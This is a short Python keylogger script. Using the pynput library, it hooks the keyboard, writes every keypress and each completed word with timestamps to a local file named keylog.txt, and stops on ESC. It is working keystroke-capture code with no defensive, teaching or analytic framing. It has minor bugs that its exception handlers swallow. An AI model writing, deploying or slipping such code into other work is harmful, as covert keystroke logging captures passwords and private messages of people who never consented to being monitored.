from pynput.keyboard import Listener, Key
import logging
import sys

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

words = [""]

def on_press(key):
    try:
        if hasattr(key, 'char'):
            words[-1] += key.char
            logging.info(f"Key pressed: {key.char}")
        else:
            if key in [Key.space, Key.enter]:
                if words[-1]:
                    words.append("")
                logging.info(f"Word completed: {words[-2]}")
            elif key == Key.backspace:
                words[-1] = words[-1][:-1]
            elif key == Key.esc:
                logging.info("Keylogger stopped")
                return False
            logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error occurred: {str(e)}")

try:
    print("Keylogger started. Press ESC to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    logging.error(f"Fatal error: {str(e)}")
    print(f"An error occurred: {str(e)}")
